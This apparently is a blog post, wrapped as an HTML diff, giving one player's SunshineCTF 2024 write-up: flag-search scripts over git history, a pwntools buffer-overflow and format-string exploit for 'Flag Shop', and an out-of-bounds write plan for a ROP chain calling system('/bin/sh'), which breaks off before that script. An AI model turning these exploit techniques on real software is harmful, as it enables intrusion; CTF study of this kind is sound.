@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="SunshineCTF 2024 writeup-by.naup96321
+Author: 堇姬NaupWAN - r.k.10
+
+This is myself some solve script and easy writeup. Just record some questions
+My sol"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="SunshineCTF 2024 writeup-by.naup96321"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="SunshineCTF 2024 writeup-by.naup96321
+Author: 堇姬NaupWAN - r.k.10
+
+This is myself some solve script and easy writeup. Just record some questions
+My sol"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg4.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg4.jpg"/>
+
+
+<!-- Title -->
+
+<title>SunshineCTF 2024 writeup-by.naup96321 | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg4.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>SunshineCTF 2024 writeup-by.naup96321</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-10-22
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <h1 id="SunshineCTF-2024-writeup-by-naup96321"><a href="#SunshineCTF-2024-writeup-by-naup96321" class="headerlink" title="SunshineCTF 2024 writeup-by.naup96321"></a>SunshineCTF 2024 writeup-by.naup96321</h1><blockquote>
+<p>Author: 堇姬Naup<br>WAN - r.k.10</p>
+</blockquote>
+<p>This is myself some solve script and easy writeup. Just record some questions</p>
+<h3 id="My-solve-list"><a href="#My-solve-list" class="headerlink" title="My solve list"></a>My solve list</h3><p><div class="img-item" data-src="https://hackmd.io/_uploads/B1JE1yNlkx.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1JE1yNlkx.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h3 id="My-team-score-board"><a href="#My-team-score-board" class="headerlink" title="My team score board"></a>My team score board</h3><p><div class="img-item" data-src="https://hackmd.io/_uploads/SyYLkkEgyx.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SyYLkkEgyx.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h1 id="Scripting"><a href="#Scripting" class="headerlink" title="Scripting"></a>Scripting</h1><p>This catagory challenge give you one git bundle<br>Use</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone &lt;git bundle&gt; &lt;folder path&gt;</span><br></pre></td></tr></table></figure>
+<p>can get git.</p>
+<h2 id="Guessy-Programmer-0"><a href="#Guessy-Programmer-0" class="headerlink" title="Guessy Programmer 0"></a>Guessy Programmer 0</h2><p>Just one file which have many many <code>sun...</code>，just use regex find <code>sun\&#123;.*?\&#125;</code> and then we will get flag.</p>
+<h3 id="script"><a href="#script" class="headerlink" title="script"></a>script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        content = file.read()</span><br><span class="line"></span><br><span class="line">    pattern = <span class="string">r&#x27;sun\&#123;.*?\&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, content)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="keyword">match</span>.group()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;adventure_novel.txt&#x27;</span></span><br><span class="line">check(file)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Guessy-Programmer-1"><a href="#Guessy-Programmer-1" class="headerlink" title="Guessy Programmer 1"></a>Guessy Programmer 1</h2><p>It has many many git commit history and all commit have file(adventure_novel_2.txt) which have many <code>sun...</code> words.</p>
+<p>First, I write git log to log.txt.<br>And then fetch all commit history and <code>git show</code> .<br>Final, using regex filter <code>sun\&#123;.*?\&#125;</code></p>
+<h3 id="script-1"><a href="#script-1" class="headerlink" title="script"></a>script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">commits</span>(<span class="params">log</span>):</span><br><span class="line">    commits = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            <span class="keyword">if</span> line.startswith(<span class="string">&quot;commit&quot;</span>):</span><br><span class="line">                commits.append(line.split()[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> commits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">match</span>(<span class="params">commit, file_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file_content = subprocess.check_output(</span><br><span class="line">            [<span class="string">&#x27;git&#x27;</span>, <span class="string">&#x27;show&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;commit&#125;</span>:<span class="subst">&#123;file_path&#125;</span>&#x27;</span>],</span><br><span class="line">            stderr=subprocess.STDOUT</span><br><span class="line">        ).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        pattern = <span class="string">r&#x27;sun\&#123;.*?\&#125;&#x27;</span></span><br><span class="line">        aa = re.findall(pattern, file_content) </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> aa  </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">log, file</span>):</span><br><span class="line">    commit = commits(log)</span><br><span class="line">    <span class="keyword">for</span> commit <span class="keyword">in</span> commits:</span><br><span class="line">        aa = <span class="keyword">match</span>(commit, file)</span><br><span class="line">        <span class="keyword">if</span> aa:</span><br><span class="line">            <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> aa:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;commit&#125;</span>: <span class="subst">&#123;<span class="keyword">match</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">log = <span class="string">&#x27;log.txt&#x27;</span>  </span><br><span class="line">file = <span class="string">&#x27;adventure_novel_2.txt&#x27;</span>  </span><br><span class="line">main(log, file)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Guessy-Programmer-2"><a href="#Guessy-Programmer-2" class="headerlink" title="Guessy Programmer 2"></a>Guessy Programmer 2</h2><p>Add some base64 confuse my regex.<br>I add <code>[A-Za-z0-9+/=]&#123;20,&#125;</code> . If it may base64 word, it will be decoded.<br>Last part same as Guessy Programmer 1.</p>
+<h3 id="script-2"><a href="#script-2" class="headerlink" title="script"></a>script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_commits</span>(<span class="params">log_file</span>):</span><br><span class="line">    commits = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            <span class="keyword">if</span> line.startswith(<span class="string">&quot;commit&quot;</span>):</span><br><span class="line">                commits.append(line.split()[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> commits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64_if_needed</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_content = base64.b64decode(content).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> decoded_content</span><br><span class="line">    <span class="keyword">except</span> (base64.binascii.Error, UnicodeDecodeError):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_pattern_in_commit</span>(<span class="params">commit, file_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file_content = subprocess.check_output(</span><br><span class="line">            [<span class="string">&#x27;git&#x27;</span>, <span class="string">&#x27;show&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;commit&#125;</span>:<span class="subst">&#123;file_path&#125;</span>&#x27;</span>],</span><br><span class="line">            stderr=subprocess.STDOUT</span><br><span class="line">        ).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pattern = <span class="string">r&#x27;sun\&#123;.*?\&#125;&#x27;</span></span><br><span class="line">        matches = re.findall(pattern, file_content)</span><br><span class="line"></span><br><span class="line">        base64_pattern = <span class="string">r&#x27;[A-Za-z0-9+/=]&#123;20,&#125;&#x27;</span></span><br><span class="line">        base64_matches = re.findall(base64_pattern, file_content)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> b64_string <span class="keyword">in</span> base64_matches:</span><br><span class="line">            decoded_content = decode_base64_if_needed(b64_string)</span><br><span class="line">            <span class="keyword">if</span> decoded_content:</span><br><span class="line">                matches += re.findall(pattern, decoded_content)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> matches</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">log_file, file_path</span>):</span><br><span class="line">    commits = get_commits(log_file)</span><br><span class="line">    <span class="keyword">for</span> commit <span class="keyword">in</span> commits:</span><br><span class="line">        matches = check_pattern_in_commit(commit, file_path)</span><br><span class="line">        <span class="keyword">if</span> matches:</span><br><span class="line">            <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;commit&#125;</span>: <span class="subst">&#123;<span class="keyword">match</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">log_file = <span class="string">&#x27;log.txt&#x27;</span>  </span><br><span class="line">file_path = <span class="string">&#x27;adventure_novel_2.txt&#x27;</span>  </span><br><span class="line">main(log_file, file_path)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Guessy-Programmer-3"><a href="#Guessy-Programmer-3" class="headerlink" title="Guessy Programmer 3"></a>Guessy Programmer 3</h2><p>It is .gif.<br>but if i cat .git, it has flag(base64 or not)<br>Use <code>.sh</code> fetch all commit git’s word.<br>Last part same as Guessy Programmer 1.</p>
+<h3 id="script-3"><a href="#script-3" class="headerlink" title="script"></a>script</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">a.txt</span></span><br><span class="line"></span><br><span class="line">commits=$(grep -oP &#x27;(?&lt;=commit )\w+&#x27; log.txt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for commit in $commits; do</span><br><span class="line"></span><br><span class="line">    git show &quot;$commit:adventure_novel_3.gif&quot; &gt;&gt; a.txt 2&gt;/dev/null</span><br><span class="line">    if [ $? -ne 0 ]; then</span><br><span class="line">        echo &quot;$commit no have adventure_novel_3.gif&quot; &gt;&gt; a.txt</span><br><span class="line">    else</span><br><span class="line">        echo &quot;$commit&quot; &gt;&gt; a.txt</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo &quot;success&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64_if_needed</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_content = base64.b64decode(content).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> decoded_content</span><br><span class="line">    <span class="keyword">except</span> (base64.binascii.Error, UnicodeDecodeError):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;a.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    content = file.read()</span><br><span class="line"></span><br><span class="line">file_content = content</span><br><span class="line">pattern = <span class="string">r&#x27;sun\&#123;.*?\&#125;&#x27;</span></span><br><span class="line">matches = re.findall(pattern, file_content)</span><br><span class="line"></span><br><span class="line">base64_pattern = <span class="string">r&#x27;[A-Za-z0-9+/=]&#123;20,&#125;&#x27;</span></span><br><span class="line">base64_matches = re.findall(base64_pattern, file_content)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> b64_string <span class="keyword">in</span> base64_matches:</span><br><span class="line">    decoded_content = decode_base64_if_needed(b64_string)</span><br><span class="line">    <span class="keyword">if</span> decoded_content:</span><br><span class="line">        matches += re.findall(pattern, decoded_content)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(matches)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>This is my CTF templates, you can give my repo one star!!! if you like.<br><a target="_blank" rel="noopener" href="https://github.com/Naupjjin/MyCTFLib.git">https://github.com/Naupjjin/MyCTFLib.git</a></p>
+<h2 id="Flag-Shop"><a href="#Flag-Shop" class="headerlink" title="Flag Shop"></a>Flag Shop</h2><p>buffer overflow and use fmt read flag pointer(on stack) to screen.<br>buffer overflow can write isadmin, and then bypass admin panel’s <code>if</code>.<br>%9$s -&gt; rsp + 0x18(flag pointer) -&gt; flag</p>
+<h3 id="script-4"><a href="#script-4" class="headerlink" title="script"></a>script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./workshop&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc 2024.sunshinectf.games 24001&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p_c(r,<span class="string">&#x27;b *0xffff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa</span>+<span class="string">b&#x27;%9$s&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Adventure-On-the-High-C"><a href="#Adventure-On-the-High-C" class="headerlink" title="Adventure! On the High C!"></a>Adventure! On the High C!</h2><p>glibc 2.39</p>
+<p>We can look this, we can input row and column and then enter this place.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">  <span class="string">&quot;&lt;&lt;&lt; Fired outside board, corrupting %p from %02x to %02x!&quot;</span>,</span><br><span class="line">  &amp;enemy_board[<span class="number">16</span> * row_input + column_input],</span><br><span class="line">  *(&amp;savedregs + <span class="number">16</span> * row_input + column_input - <span class="number">528</span>),</span><br><span class="line">  choice);</span><br><span class="line">*(&amp;savedregs + <span class="number">16</span> * row_input + column_input - <span class="number">528</span>) = choice;</span><br></pre></td></tr></table></figure>
+
+<p>It have filter your input, but still print and write wrong index. It is oob read and oob write</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">filter_row_column</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &lt;= <span class="number">0xF</span> &amp;&amp; a2 &lt;= <span class="number">0xF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>oob read and oob write can leak PIE, write <code>/bin/sh\x00</code>, and write ROP to ret address<br>pop rdi + &#x2F;bin&#x2F;sh address + ret + system plt (offset you can use 16 * row + column to caculate)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__int64 savedregs; <span class="comment">// [rsp+220h] [rbp+0h] BYREF</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="script-5"><a href="#script-5" class="headerlink" title="script"></a>script</h3><p>remote can work, but local don’t work. so strange</p>
